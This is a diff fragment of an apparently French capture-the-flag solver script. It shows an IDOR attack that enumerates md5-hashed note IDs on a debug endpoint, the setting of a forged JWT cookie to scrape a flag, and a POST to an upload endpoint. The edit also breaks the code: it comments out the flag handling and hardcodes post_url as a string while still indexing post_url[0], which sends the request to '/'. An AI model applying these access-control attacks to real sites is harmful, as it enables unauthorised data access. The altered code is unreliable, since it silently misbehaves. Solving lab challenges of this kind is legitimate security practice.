@@ -163,7 +163,6 @@ for id_notes in re.findall(regex_notes, response.text):
 
 print("\n[~] Performing IDOR Attack ...")
 for i in range(4,100):
-    # md5(i)
     id_notes = hashlib.md5(str(i).encode()).hexdigest()
     response = session.get(f"{url_challenge}/intranetCompany/debugONLY?id_notes={id_notes}")
     if "Employés" not in response.text:
@@ -250,15 +249,15 @@ print("\n[~] Sending the new JWT ...")
 session.cookies.set('jwt', new_jwt)
 response = session.get(f"{url_challenge}{members_url[0]}")
 flag = re.findall(regex_flag, response.text)
-print(f"[+] {colored(flag[0], 'green')}")
-all_flags.append(flag[0])
+# print(f"[+] {colored(flag[0], 'green')}")
+# all_flags.append(flag[0])
 
 print(colored("\n=====> [+] Récupération du septième flag <=====", 'red', attrs=['bold']))
 
 POST_regex = r'action="(/[^"]+)"'
 response = session.get(f"{url_challenge}{members_url[0]}")
 post_url = re.findall(POST_regex, response.text)
-print("POST request found : " + post_url[0])
+post_url = "/TASKS_UPLOADER"
 
 print("\n[~] Sending POST request ...")
 response = session.post(f"{url_challenge}{post_url[0]}", data={'text': 'd'})
